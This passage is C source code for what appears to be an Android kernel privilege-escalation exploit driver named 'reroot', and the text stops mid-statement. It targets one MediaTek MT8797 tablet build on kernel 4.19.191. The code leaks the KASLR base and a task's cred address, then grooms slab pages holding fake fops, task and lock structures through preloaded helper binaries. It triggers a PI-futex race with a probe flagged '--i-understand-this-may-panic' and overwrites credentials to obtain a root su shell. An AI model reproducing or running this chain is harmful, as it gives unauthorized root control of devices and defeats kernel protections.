// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 yoyicue

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define REMOTE_TARGET  "/data/local/tmp/ionstack_perf_target"
#define REMOTE_PRELOAD "/data/local/tmp/ionstack_preload.so"
#define REMOTE_PROBE   "/data/local/tmp/cve43499_chainwalk_probe_arm32"
#define REMOTE_SU      "/data/local/tmp/su"
#define REMOTE_SOCKET  "/data/local/tmp/temp_su.sock"

#define HELPER_ATTEMPTS 6
#define HELPER_TIMEOUT_MS 300000U
#define CAPTURE_TIMEOUT_MS 90000U
#define TARGET_READY_TIMEOUT_MS 30000U
#define ROOT_READY_TIMEOUT_MS 30000U
#define CAPTURE_WORKERS 6U

#define EXPECTED_DEVICE "ls12_mt8797_wifi_64"
#define EXPECTED_KERNEL_RELEASE "4.19.191"
#define EXPECTED_KERNEL_VERSION \
  "#1 SMP PREEMPT Mon Jun 29 04:08:29 CST 2026"
#define EXPECTED_SDK "33"
#define EXPECTED_FINGERPRINT \
  "alps/vnd_ls12_mt8797_wifi_64/ls12_mt8797_wifi_64:13/" \
  "TP1A.220624.014/260:user/release-keys"

struct env_pair {
  const char *name;
  const char *value;
};

struct child_proc {
  pid_t pid;
  int fd;
  int exited;
  int status;
  char partial[16384];
  size_t partial_len;
};

struct target_state {
  int ready;
  int root_ready;
  pid_t remote_pid;
  uint64_t kaslr_base;
  uint64_t task;
  uint64_t cred;
  unsigned cred_hits;
  unsigned base_hits;
};

struct helper_state {
  int hold_ready;
  int fresh_ok;
  int order_ok;
  int pfn_ok;
  int content_ok;
  uint64_t hold_base;
  uint64_t fake_lock;
  uint64_t fake_w0;
  uint64_t fake_task;
  uint64_t fake_fops;
  uint64_t binwrite;
  uint64_t fresh_candidate;
  uint64_t target_pfn;
  uint64_t alloc_pfn;
  unsigned fresh_wanted;
  unsigned fresh_matches;
};

struct capture_state {
  int saw_result;
  int ok;
  int su_ready;
  int restore_ok;
};

static volatile sig_atomic_t stop_requested;

static void on_signal(int signo) {
  (void)signo;
  stop_requested = 1;
}

static uint64_t monotonic_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000U + (uint64_t)ts.tv_nsec / 1000000U;
}

static void sleep_ms(unsigned ms) {
  struct timespec delay = {
      .tv_sec = ms / 1000U,
      .tv_nsec = (long)(ms % 1000U) * 1000000L,
  };
  while (nanosleep(&delay, &delay) != 0 && errno == EINTR &&
         !stop_requested) {
  }
}

static int read_first_line(const char *path, char *buffer, size_t size) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t got = read(fd, buffer, size - 1);
  int saved_errno = errno;
  close(fd);
  if (got <= 0) {
    errno = saved_errno;
    return -1;
  }
  buffer[got] = '\0';
  char *newline = strpbrk(buffer, "\r\n");
  if (newline) {
    *newline = '\0';
  }
  return 0;
}

static int set_nonblocking(int fd) {
  int flags = fcntl(fd, F_GETFL, 0);
  if (flags < 0) {
    return -1;
  }
  return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static void child_init(struct child_proc *child) {
  memset(child, 0, sizeof(*child));
  child->pid = -1;
  child->fd = -1;
}

static int spawn_child(struct child_proc *child, const char *path,
                       char *const argv[], const struct env_pair *environment,
                       size_t environment_count) {
  int pipe_fds[2];
  if (pipe2(pipe_fds, O_CLOEXEC) != 0) {
    return -1;
  }
  pid_t pid = fork();
  if (pid < 0) {
    int saved_errno = errno;
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    errno = saved_errno;
    return -1;
  }
  if (pid == 0) {
    setpgid(0, 0);
    dup2(pipe_fds[1], STDOUT_FILENO);
    dup2(pipe_fds[1], STDERR_FILENO);
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    clearenv();
    setenv("PATH", "/system/bin:/system_ext/bin:/vendor/bin", 1);
    for (size_t i = 0; i < environment_count; ++i) {
      if (setenv(environment[i].name, environment[i].value, 1) != 0) {
        dprintf(STDERR_FILENO, "setenv %s failed: %s\n",
                environment[i].name, strerror(errno));
        _exit(126);
      }
    }
    execv(path, argv);
    dprintf(STDERR_FILENO, "exec %s failed: %s\n", path, strerror(errno));
    _exit(127);
  }

  close(pipe_fds[1]);
  setpgid(pid, pid);
  set_nonblocking(pipe_fds[0]);
  child_init(child);
  child->pid = pid;
  child->fd = pipe_fds[0];
  return 0;
}

static void reap_child(struct child_proc *child) {
  if (child->pid <= 0 || child->exited) {
    return;
  }
  int status = 0;
  pid_t got = waitpid(child->pid, &status, WNOHANG);
  if (got == child->pid) {
    child->exited = 1;
    child->status = status;
  }
}

static int child_exit_code(const struct child_proc *child) {
  if (!child->exited) {
    return -1;
  }
  if (WIFEXITED(child->status)) {
    return WEXITSTATUS(child->status);
  }
  if (WIFSIGNALED(child->status)) {
    return 128 + WTERMSIG(child->status);
  }
  return 255;
}

static void stop_child(struct child_proc *child) {
  if (child->pid > 0 && !child->exited) {
    kill(-child->pid, SIGTERM);
    uint64_t deadline = monotonic_ms() + 2000U;
    while (monotonic_ms() < deadline) {
      reap_child(child);
      if (child->exited) {
        break;
      }
      sleep_ms(25);
    }
    if (!child->exited) {
      kill(-child->pid, SIGKILL);
      while (waitpid(child->pid, &child->status, 0) < 0 && errno == EINTR) {
      }
      child->exited = 1;
    }
  }
  if (child->fd >= 0) {
    close(child->fd);
    child->fd = -1;
  }
}

typedef void (*line_callback)(const char *line, void *opaque);

static void emit_line(struct child_proc *child, const char *line, size_t len,
                      line_callback callback, void *opaque) {
  char local[16384];
  if (len >= sizeof(local)) {
    len = sizeof(local) - 1;
  }
  memcpy(local, line, len);
  local[len] = '\0';
  if (len > 0 && local[len - 1] == '\r') {
    local[len - 1] = '\0';
  }
  printf("%s\n", local);
  if (callback) {
    callback(local, opaque);
  }
  (void)child;
}

static int drain_child(struct child_proc *child, line_callback callback,
                       void *opaque) {
  if (child->fd < 0) {
    return 0;
  }
  char buffer[4096];
  int read_any = 0;
  for (;;) {
    ssize_t got = read(child->fd, buffer, sizeof(buffer));
    if (got > 0) {
      read_any = 1;
      for (ssize_t i = 0; i < got; ++i) {
        char ch = buffer[i];
        if (ch == '\n') {
          emit_line(child, child->partial, child->partial_len, callback,
                    opaque);
          child->partial_len = 0;
        } else if (child->partial_len + 1 < sizeof(child->partial)) {
          child->partial[child->partial_len++] = ch;
        }
      }
      continue;
    }
    if (got == 0) {
      if (child->partial_len > 0) {
        emit_line(child, child->partial, child->partial_len, callback,
                  opaque);
        child->partial_len = 0;
      }
      close(child->fd);
      child->fd = -1;
      break;
    }
    if (errno == EINTR) {
      continue;
    }
    if (errno == EAGAIN || errno == EWOULDBLOCK) {
      break;
    }
    close(child->fd);
    child->fd = -1;
    break;
  }
  reap_child(child);
  return read_any;
}

static int wait_for_child_condition(struct child_proc *child,
                                    unsigned timeout_ms,
                                    line_callback callback, void *opaque,
                                    const int *condition) {
  uint64_t deadline = monotonic_ms() + timeout_ms;
  while (!stop_requested && monotonic_ms() < deadline) {
    if (condition && *condition) {
      return 0;
    }
    struct pollfd pfd = {.fd = child->fd, .events = POLLIN | POLLHUP};
    int poll_rc = child->fd >= 0 ? poll(&pfd, 1, 250) : 0;
    if (poll_rc > 0 || child->fd < 0) {
      drain_child(child, callback, opaque);
    }
    reap_child(child);
    if (child->exited && child->fd < 0) {
      return condition && *condition ? 0 : -1;
    }
  }
  return condition && *condition ? 0 : -1;
}

static int run_capture_command(const char *path, char *const argv[],
                               char *output, size_t output_size,
                               unsigned timeout_ms) {
  struct child_proc child;
  child_init(&child);
  if (spawn_child(&child, path, argv, NULL, 0) != 0) {
    return -1;
  }
  size_t used = 0;
  uint64_t deadline = monotonic_ms() + timeout_ms;
  while (monotonic_ms() < deadline && (!child.exited || child.fd >= 0)) {
    struct pollfd pfd = {.fd = child.fd, .events = POLLIN | POLLHUP};
    if (child.fd >= 0) {
      poll(&pfd, 1, 100);
      char buffer[1024];
      for (;;) {
        ssize_t got = read(child.fd, buffer, sizeof(buffer));
        if (got > 0) {
          size_t copy = (size_t)got;
          if (copy > output_size - 1 - used) {
            copy = output_size - 1 - used;
          }
          if (copy > 0) {
            memcpy(output + used, buffer, copy);
            used += copy;
          }
          continue;
        }
        if (got == 0) {
          close(child.fd);
          child.fd = -1;
        }
        break;
      }
    }
    reap_child(&child);
  }
  output[used] = '\0';
  if (!child.exited) {
    stop_child(&child);
    return -1;
  }
  if (child.fd >= 0) {
    close(child.fd);
  }
  return child_exit_code(&child);
}

static int existing_root_works(void) {
  if (access(REMOTE_SU, X_OK) != 0) {
    return 0;
  }
  char *argv[] = {(char *)REMOTE_SU, "-c", "id", NULL};
  char output[4096];
  int rc = run_capture_command(REMOTE_SU, argv, output, sizeof(output), 5000);
  if (rc == 0 && strstr(output, "uid=0(root)")) {
    printf("[reroot] existing root verified: %s", output);
    if (!strchr(output, '\n')) {
      printf("\n");
    }
    return 1;
  }
  return 0;
}

static void target_line(const char *line, void *opaque) {
  struct target_state *state = opaque;
  const char *ready = strstr(line, "[perf-target] READY ");
  if (ready) {
    int pid = 0;
    uint64_t base = 0;
    uint64_t task = 0;
    uint64_t cred = 0;
    unsigned task_hits = 0;
    unsigned cred_hits = 0;
    unsigned base_hits = 0;
    size_t samples = 0;
    int fields = sscanf(
        ready,
        "[perf-target] READY pid=%d kaslr_base=0x%" SCNx64
        " task=0x%" SCNx64 " task_hits=%u cred=0x%" SCNx64
        " cred_hits=%u base_hits=%u samples=%zu",
        &pid, &base, &task, &task_hits, &cred, &cred_hits, &base_hits,
        &samples);
    if (fields == 8 && pid > 0 && base != 0 && cred != 0 && cred_hits >= 2) {
      state->ready = 1;
      state->remote_pid = pid;
      state->kaslr_base = base;
      state->task = task;
      state->cred = cred;
      state->cred_hits = cred_hits;
      state->base_hits = base_hits;
    }
  }
  if (strstr(line, "[perf-target] ROOT_READY ")) {
    state->root_ready = 1;
  }
}

static int line_value_is_one(const char *line, const char *key) {
  const char *where = strstr(line, key);
  if (!where) {
    return 0;
  }
  where += strlen(key);
  return *where == '1' && (where[1] == '\0' || where[1] == ' ');
}

static void helper_line(const char *line, void *opaque) {
  struct helper_state *state = opaque;
  const char *fresh = strstr(line, "ks prepare-fresh-set validation ");
  if (fresh) {
    int ok = 0;
    uint64_t candidate = 0;
    unsigned wanted = 0;
    unsigned matches = 0;
    int fields = sscanf(fresh,
                        "ks prepare-fresh-set validation ok=%d candidate=%"
                        SCNx64 " wanted=%u matches=%u",
                        &ok, &candidate, &wanted, &matches);
    if (fields == 4) {
      state->fresh_ok = ok == 1 && wanted > 0 && matches >= wanted;
      state->fresh_candidate = candidate;
      state->fresh_wanted = wanted;
      state->fresh_matches = matches;
    }
  }

  const char *order = strstr(line, "reclaim-order-gate sends=");
  if (order) {
    unsigned sends = 0;
    unsigned success = 0;
    unsigned fail = 0;
    int accepted = 0;
    if (sscanf(order,
               "reclaim-order-gate sends=%u order3_success=%u "
               "order3_fail=%u accepted=%d",
               &sends, &success, &fail, &accepted) == 4) {
      state->order_ok = accepted == 1 && sends > 0 && success == sends &&
                        fail == 0;
    }
  }

  const char *pfn = strstr(line, "reclaim-pfn-result ");
  if (pfn) {
    unsigned candidates = 0;
    unsigned free_hits = 0;
    unsigned alloc_hits = 0;
    unsigned matched_hits = 0;
    uint64_t target = 0;
    uint64_t alloc = 0;
    int matched = 0;
    if (sscanf(pfn,
               "reclaim-pfn-result candidates=%u free_hits=%u alloc_hits=%u "
               "matched_hits=%u target_pfn=%" SCNx64
               " alloc_pfn=%" SCNx64 " matched=%d",
               &candidates, &free_hits, &alloc_hits, &matched_hits, &target,
               &alloc, &matched) == 7) {
      state->pfn_ok = matched == 1 && candidates > 0 && free_hits > 0 &&
                      alloc_hits > 0 && matched_hits > 0 && target == alloc;
      state->target_pfn = target;
      state->alloc_pfn = alloc;
    }
  }

  const char *content = strstr(line, "reclaim-content-validate ");
  if (content && line_value_is_one(content, "ok=")) {
    state->content_ok = 1;
  }

  const char *hold = strstr(line, "stage fops-page-hold hold-ready ");
  if (hold) {
    uint64_t base = 0;
    uint64_t fake_lock = 0;
    uint64_t fake_w0 = 0;
    uint64_t fake_task = 0;
    uint64_t fake_fops = 0;
    uint64_t binwrite = 0;
    int fields = sscanf(
        hold,
        "stage fops-page-hold hold-ready base=%" SCNx64
        " fake_lock=%" SCNx64 " fake_w0=%" SCNx64
        " fake_task=%" SCNx64 " fake_fops=%" SCNx64
        " binwrite=%" SCNx64,
        &base, &fake_lock, &fake_w0, &fake_task, &fake_fops, &binwrite);
    if (fields == 6 && base && fake_lock && fake_w0 && fake_task &&
        fake_fops && binwrite) {
      state->hold_base = base;
      state->fake_lock = fake_lock;
      state->fake_w0 = fake_w0;
      state->fake_task = fake_task;
      state->fake_fops = fake_fops;
      state->binwrite = binwrite;
      state->hold_ready = 1;
    }
  }
}

static void capture_line(const char *line, void *opaque) {
  struct capture_state *state = opaque;
  const char *result = strstr(line, "stage-fops-write-root-result ");
  if (!result) {
    return;
  }
  state->saw_result = 1;
  state->ok = line_value_is_one(result, "ok=");
  state->su_ready = line_value_is_one(result, "su_ready=");
  const char *restore = strstr(result, " restore=");
  if (restore) {
    unsigned long value = strtoul(restore + strlen(" restore="), NULL, 0);
    state->restore_ok = value == 8;
  }
}

static int spawn_target(struct child_proc *child, unsigned hold_sec) {
  char hold_arg[64];
  snprintf(hold_arg, sizeof(hold_arg), "--hold-sec=%u", hold_sec);
  char *argv[] = {(char *)REMOTE_TARGET, "--sample-ms=2500", "--freq=4000",
                  "--attempts=8", hold_arg, NULL};
  return spawn_child(child, REMOTE_TARGET, argv, NULL, 0);
}

static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
                        unsigned hold_sec, unsigned attempt) {
  char base_value[32];
  char hold_value[32];
  char partial_slabs_value[32];
  char posttarget_sends_value[32];
  snprintf(base_value, sizeof(base_value), "0x%016" PRIx64, kaslr_base);
  snprintf(hold_value, sizeof(hold_value), "%u", hold_sec);
  snprintf(partial_slabs_value, sizeof(partial_slabs_value), "%u",
           18U + (attempt > 1 ? (attempt - 1U) * 2U : 0U));
  snprintf(posttarget_sends_value, sizeof(posttarget_sends_value), "%u",
           8192U + (attempt > 1 ? (attempt - 1U) * 1024U : 0U));
  struct env_pair environment[] = {
      {"IONSTACK_KASLR_BASE", base_value},
      {"IONSTACK_KS_COLLISIONS", "8"},
      {"IONSTACK_KS_THREADS", "8"},
      {"IONSTACK_RECLAIM_CORE", "1"},
      {"IONSTACK_RECLAIM_PARTIAL_SLABS", partial_slabs_value},
      {"IONSTACK_RECLAIM_SPLICE_ORDER_GATE", "1"},
      {"IONSTACK_RECLAIM_REQUIRE_ORDER3", "1"},
      {"IONSTACK_RECLAIM_PFN_IDENTITY", "1"},
      {"IONSTACK_RECLAIM_RELEASE_PREPARE_EARLY", "1"},
      {"IONSTACK_RECLAIM_TARGET_LAST", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_SENDS", "0"},
      {"IONSTACK_RECLAIM_PRETARGET_HOLD", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_LATE", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SEARCH", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SENDS", posttarget_sends_value},
      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS", "32"},
      {"IONSTACK_RECLAIM_VALIDATE_CONTENT", "1"},
      {"IONSTACK_RECLAIM_REQUIRE_CONTENT", "1"},
      {"IONSTACK_STAGE", "fops-page-hold"},
      {"IONSTACK_PAGE_HOLD_SEC", hold_value},
      {"IONSTACK_FOPS_PI_WAITERS", "0"},
      {"IONSTACK_FOPS_PI_LEFTMOST", "1"},
      {"IONSTACK_FOPS_PI_NODE_SAFE", "0"},
      {"IONSTACK_FOPS_PI_RB_SHAPE", "default"},
      {"IONSTACK_FOPS_LOCK_OWNER_MODE", "fake-task"},
      {"IONSTACK_FOPS_LOCK_WAITERS", "1"},
      {"IONSTACK_FOPS_WAIT_LOCK_WORD", "0"},
      {"LD_PRELOAD", REMOTE_PRELOAD},
  };
  char *argv[] = {"/system/bin/toybox", "true", NULL};
  return spawn_child(child, argv[0], argv, environment,
                     sizeof(environment) / sizeof(environment[0]));
}

static int spawn_capture(struct child_proc *child, unsigned worker,
                         const struct target_state *target,
                         const struct helper_state *helper,
                         uint64_t linear_map_base) {
  char kaslr_value[32];
  char cred_value[32];
  char fops_value[32];
  char linear_value[32];
  snprintf(kaslr_value, sizeof(kaslr_value), "0x%016" PRIx64,
           target->kaslr_base);
  snprintf(cred_value, sizeof(cred_value), "0x%016" PRIx64, target->cred);
  snprintf(fops_value, sizeof(fops_value), "0x%016" PRIx64,
           helper->fake_fops);
  snprintf(linear_value, sizeof(linear_value), "0x%016" PRIx64,
           linear_map_base);
  struct env_pair environment[] = {
      {"IONSTACK_STAGE", "fops-write-root"},
      {"IONSTACK_EXPECT_FAKE_FOPS", fops_value},
      {"IONSTACK_FOPS_ROOT_ROUTE", "cred-writeonly"},
      {"IONSTACK_TARGET_CRED", cred_value},
      {"IONSTACK_FOPS_ROOT_ATTEMPTS", "10000000"},
      {"IONSTACK_FOPS_ROOT_RETRY_US", "0"},
      {"IONSTACK_FOPS_ROOT_CLEANUP_DELAY_MS", "6500"},
      {"IONSTACK_LINEAR_MAP_BASE", linear_value},
      {"IONSTACK_KASLR_BASE", kaslr_value},
      {"LD_PRELOAD", REMOTE_PRELOAD},
  };
  char *argv[] = {"/system/bin/toybox", "true", NULL};
  int rc = spawn_child(child, argv[0], argv, environment,
                       sizeof(environment) / sizeof(environment[0]));
  if (rc == 0) {
    static const int cpus[CAPTURE_WORKERS] = {0, 2, 3, 4, 5, 6};
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpus[worker % CAPTURE_WORKERS], &set);
    if (sched_setaffinity(child->pid, sizeof(set), &set) != 0) {
      fprintf(stderr,
              "[reroot] capture affinity warning worker=%u pid=%d errno=%d\n",
              worker, child->pid, errno);
    }
  }
  return rc;
}

static int spawn_probe(struct child_proc *child,
                       const struct helper_state *helper) {
  char task_arg[64];
  char lock_arg[64];
  snprintf(task_arg, sizeof(task_arg), "--io-submit-task=0x%016" PRIx64,
           helper->fake_task);
  snprintf(lock_arg, sizeof(lock_arg), "--io-submit-lock=0x%016" PRIx64,
           helper->fake_lock);
  char *argv[] = {
      (char *)REMOTE_PROBE,
      "--stage-edeadlk-idle",
      "--i-understand-this-may-panic",
      "--waiter-post-return=pipe-read-io-submit",
      task_arg,
      lock_arg,
      "--watchdog-sec=20",
      "--hold-ms=5000",
      "--io-submit-opcode=200",
      "--waiter-adjust-pi-after-post-return",
      "--adjust-pi-repeats=1",
      "--waiter-isolated-hold=getuidloop",
      "--adjust-pi-start-isolated-hold",
      "--idle-ms=100",
      NULL,
  };
  return spawn_child(child, REMOTE_PROBE, argv, NULL, 0);
}

static int wait_captures_and_probe(struct child_proc *captures,
                                   struct capture_state *capture_states,
                                   size_t capture_count,
                                   struct child_proc *probe) {
  uint64_t deadline = monotonic_ms() + CAPTURE_TIMEOUT_MS;
  while (!stop_requested && monotonic_ms() < deadline) {
    struct pollfd pollfds[CAPTURE_WORKERS + 1];
    nfds_t count = 0;
    for (size_t i = 0; i < capture_count; ++i) {
      if (captures[i].fd >= 0) {
        pollfds[count++] = (struct pollfd){.fd = captures[i].fd,
                                           .events = POLLIN | POLLHUP};
      }
    }
    if (probe->fd >= 0) {
      pollfds[count++] =
          (struct pollfd){.fd = probe->fd, .events = POLLIN | POLLHUP};
    }
    if (count > 0) {
      poll(pollfds, count, 250);
    } else {
      sleep_ms(25);
    }
    int any_success = 0;
    int all_captures_exited = 1;
    for (size_t i = 0; i < capture_count; ++i) {
      drain_child(&captures[i], capture_line, &capture_states[i]);
      reap_child(&captures[i]);
      if (!captures[i].exited || captures[i].fd >= 0) {
        all_captures_exited = 0;
      }
      if (capture_states[i].saw_result && capture_states[i].ok &&
          capture_states[i].restore_ok) {
        any_success = 1;
      }
    }
    drain_child(probe, NULL, NULL);
    reap_child(probe);
    if (any_success && probe->exited && probe->fd < 0) {
      return 0;
    }
    if (all_captures_exited && probe->exited && probe->fd < 0) {
      return 0;
    }
  }
  return -1;
}

static int all_required_files_present(void) {
  const char *paths[] = {REMOTE_TARGET, REMOTE_PRELOAD, REMOTE_PROBE};
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); ++i) {
    struct stat st;
    if (stat(paths[i], &st) != 0 || !S_ISREG(st.st_mode)) {
      fprintf(stderr, "[reroot] missing artifact %s\n", paths[i]);
      return 0;
    }
  }
  if (access(REMOTE_TARGET, X_OK) != 0 || access(REMOTE_PROBE, X_OK) != 0) {
    fprintf(stderr, "[reroot] target/probe is not executable\n");
    return 0;
  }
  return 1;
}

static int target_profile_matches(void) {
  struct utsname uts;
  if (uname(&uts) != 0) {
    perror("[reroot] uname");
    return 0;
  }
  char device[PROP_VALUE_MAX] = {0};
  char sdk[PROP_VALUE_MAX] = {0};
  char fingerprint[PROP_VALUE_MAX] = {0};
  __system_property_get("ro.product.device", device);
  __system_property_get("ro.build.version.sdk", sdk);
  __system_property_get("ro.build.fingerprint", fingerprint);
  int release_ok =
      strncmp(uts.release, EXPECTED_KERNEL_RELEASE,
              strlen(EXPECTED_KERNEL_RELEASE)) == 0;
  int device_ok = strcmp(device, EXPECTED_DEVICE) == 0;
  int sdk_ok = strcmp(sdk, EXPECTED_SDK) == 0;
  int version_ok = strcmp(uts.version, EXPECTED_KERNEL_VERSION) == 0;
  int fingerprint_ok = strcmp(fingerprint, EXPECTED_FINGERPRINT) == 0;
  printf("[reroot] PROFILE machine=%s release=%s device=%s sdk=%s "
         "release_ok=%d version_ok=%d device_ok=%d sdk_ok=%d "
         "fingerprint_ok=%d\n",
         uts.machine, uts.release, device, sdk, release_ok, version_ok,
         device_ok, sdk_ok, fingerprint_ok);
  return strcmp(uts.machine, "aarch64") == 0 && release_ok && device_ok &&
         sdk_ok && version_ok && fingerprint_ok;
}

int main(int argc, char **argv) {
  unsigned target_hold_sec = 900;
  unsigned page_hold_sec = 240;
  int force = 0;
  int validate_only = 0;
  int preflight_only = 0;
  for (int i = 1; i < argc; ++i) {
    if (strcmp(argv[i], "--force") == 0) {
      force = 1;
    } else if (strcmp(argv[i], "--validate-only") == 0) {
      validate_only = 1;
    } else if (strcmp(argv[i], "--preflight-only") == 0) {
      preflight_only = 1;
    } else if (strncmp(argv[i], "--target-hold-sec=", 18) == 0) {
      target_hold_sec = (unsigned)strtoul(argv[i] + 18, NULL, 0);
    } else if (strncmp(argv[i], "--page-hold-sec=", 16) == 0) {
      page_hold_sec = (unsigned)strtoul(argv[i] + 16, NULL, 0);
    } else if (strcmp(argv[i], "--help") == 0) {
      printf("usage: %s [--force] [--preflight-only] [--validate-only] "
             "[--target-hold-sec=N] "
             "[--page-hold-sec=N]\n",
             argv[0]);
      return 0;
    } else {
      fprintf(stderr, "unknown argument: %s\n", argv[i]);
      return 2;
    }
  }
  if (target_hold_sec < 60 || page_hold_sec < 60) {
    fprintf(stderr, "[reroot] hold times must be at least 60 seconds\n");
    return 2;
  }

  setvbuf(stdout, NULL, _IOLBF, 0);
  setvbuf(stderr, NULL, _IOLBF, 0);
  signal(SIGINT, on_signal);
  signal(SIGTERM, on_signal);
  signal(SIGHUP, on_signal);

  char boot_id[128] = "unknown";
  read_first_line("/proc/sys/kernel/random/boot_id", boot_id, sizeof(boot_id));
  printf("[reroot] START boot_id=%s pid=%d uid=%d gid=%d pure_c=1\n", boot_id,
         getpid(), getuid(), getgid());

  if (!force && !preflight_only && !validate_only && existing_root_works()) {
    printf("[reroot] SUCCESS already_root=1 boot_id=%s\n", boot_id);
    return 0;
  }
  if (!all_required_files_present()) {
    return 1;
  }
  if (!target_profile_matches()) {
    fprintf(stderr, "[reroot] refusing unsupported kernel/device profile\n");
    return 1;
  }
  if (preflight_only) {
    printf("[reroot] PREFLIGHT_OK boot_id=%s\n", boot_id);
    return 0;
  }

  struct child_proc target;
  struct child_proc holder;
  struct child_proc captures[CAPTURE_WORKERS];
  struct child_proc probe;
  child_init(&target);
  child_init(&holder);
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    child_init(&captures[i]);
  }
  child_init(&probe);
  struct target_state target_state;
  memset(&target_state, 0, sizeof(target_state));
  int result = 1;

  if (spawn_target(&target, target_hold_sec) != 0) {
    perror("[reroot] spawn target");
    goto cleanup;
  }
  if (wait_for_child_condition(&target, TARGET_READY_TIMEOUT_MS, target_line,
                               &target_state, &target_state.ready) != 0) {
    fprintf(stderr, "[reroot] target leak did not become ready\n");
    goto cleanup;
  }
  printf("[reroot] LEAK_OK kaslr_base=0x%016" PRIx64
         " task=0x%016" PRIx64 " cred=0x%016" PRIx64
         " cred_hits=%u base_hits=%u\n",
         target_state.kaslr_base, target_state.task, target_state.cred,
         target_state.cred_hits, target_state.base_hits);

  struct helper_state helper_state;
  memset(&helper_state, 0, sizeof(helper_state));
  int helper_ok = 0;
  for (unsigned attempt = 1; attempt <= HELPER_ATTEMPTS; ++attempt) {
    printf("[reroot] HOLDER attempt=%u/%u\n", attempt, HELPER_ATTEMPTS);
    memset(&helper_state, 0, sizeof(helper_state));
    if (spawn_holder(&holder, target_state.kaslr_base, page_hold_sec,
                     attempt) != 0) {
      perror("[reroot] spawn holder");
      goto cleanup;
    }
    int wait_rc = wait_for_child_condition(
        &holder, HELPER_TIMEOUT_MS, helper_line, &helper_state,
        &helper_state.hold_ready);
    int fresh_base_ok =
        helper_state.hold_ready &&
        ((helper_state.fresh_candidate & ~UINT64_C(0x7fff)) ==
             helper_state.hold_base ||
         (helper_state.fresh_candidate & ~UINT64_C(0xfff)) ==
             helper_state.hold_base);
    int layout_ok =
        helper_state.hold_ready &&
        helper_state.fake_lock >= helper_state.hold_base &&
        helper_state.fake_lock < helper_state.hold_base + UINT64_C(0x8000) &&
        helper_state.fake_task >= helper_state.hold_base &&
        helper_state.fake_task < helper_state.hold_base + UINT64_C(0x8000) &&
        helper_state.fake_fops >= helper_state.hold_base &&
        helper_state.fake_fops < helper_state.hold_base + UINT64_C(0x8000);
    helper_ok = wait_rc == 0 && helper_state.fresh_ok && fresh_base_ok &&
                layout_ok &&
                helper_state.order_ok && helper_state.pfn_ok &&
                helper_state.content_ok && helper_state.hold_ready;
    if (helper_ok) {
      break;
    }
    fprintf(stderr,
            "[reroot] HOLDER_REJECT fresh=%d order=%d pfn=%d content=%d "
            "hold=%d fresh_base=%d layout=%d matches=%u/%u "
            "next_partial_slabs=%u next_posttarget_sends=%u\n",
            helper_state.fresh_ok, helper_state.order_ok, helper_state.pfn_ok,
            helper_state.content_ok, helper_state.hold_ready,
            fresh_base_ok, layout_ok,
            helper_state.fresh_matches, helper_state.fresh_wanted,
            18U + attempt * 2U, 8192U + attempt * 1024U);
    stop_child(&holder);
    child_init(&holder);
  }
  if (!helper_ok) {
    fprintf(stderr, "[reroot] holder attempts exhausted\n");
    goto cleanup;
  }

  uint64_t pfn_address = helper_state.target_pfn << 12;
  if (helper_state.hold_base < pfn_address) {
    fprintf(stderr, "[reroot] invalid direct-map derivation\n");
    goto cleanup;
  }
  uint64_t linear_map_base = helper_state.hold_base - pfn_address;
  if ((linear_map_base & 0xfffU) != 0 ||
      (linear_map_base >> 40) != UINT64_C(0xffffff)) {
    fprintf(stderr, "[reroot] invalid linear-map base=0x%016" PRIx64 "\n",
            linear_map_base);
    goto cleanup;
  }
  printf("[reroot] HOLDER_OK base=0x%016" PRIx64
         " fake_task=0x%016" PRIx64 " fake_lock=0x%016" PRIx64
         " fake_fops=0x%016" PRIx64 " target_pfn=0x%" PRIx64
         " linear_map_base=0x%016" PRIx64 "\n",
         helper_state.hold_base, helper_state.fake_task,
         helper_state.fake_lock, helper_state.fake_fops,
         helper_state.target_pfn, linear_map_base);

  if (validate_only) {
    printf("[reroot] VALIDATION_OK boot_id=%s kaslr_base=0x%016" PRIx64
           " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64 "\n",
           boot_id, target_state.kaslr_base, target_state.cred,
           linear_map_base);
    result = 0;
    goto cleanup;
  }

  struct capture_state capture_states[CAPTURE_WORKERS];
  memset(capture_states, 0, sizeof(capture_states));
  for (unsigned i = 0; i < CAPTURE_WORKERS; ++i) {
    if (spawn_capture(&captures[i], i, &target_state, &helper_state,
                      linear_map_base) != 0) {
      perror("[reroot] spawn capture worker");
      goto cleanup;
    }
    printf("[reroot] CAPTURE_WORKER index=%u pid=%d\n", i,
           captures[i].pid);
  }
  sleep_ms(500);
  if (spawn_probe(&probe, &helper_state) != 0) {
    perror("[reroot] spawn probe");
    goto cleanup;
  }
  printf("[reroot] TRIGGER capture_workers=%u probe_pid=%d\n",
         CAPTURE_WORKERS, probe.pid);

  if (wait_captures_and_probe(captures, capture_states, CAPTURE_WORKERS,
                              &probe) != 0) {
    fprintf(stderr, "[reroot] capture/probe timeout\n");
    goto cleanup;
  }
  int probe_rc = child_exit_code(&probe);
  unsigned capture_results = 0;
  unsigned capture_successes = 0;
  unsigned capture_su_ready = 0;
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    capture_results += capture_states[i].saw_result ? 1U : 0U;
    capture_successes += capture_states[i].saw_result &&
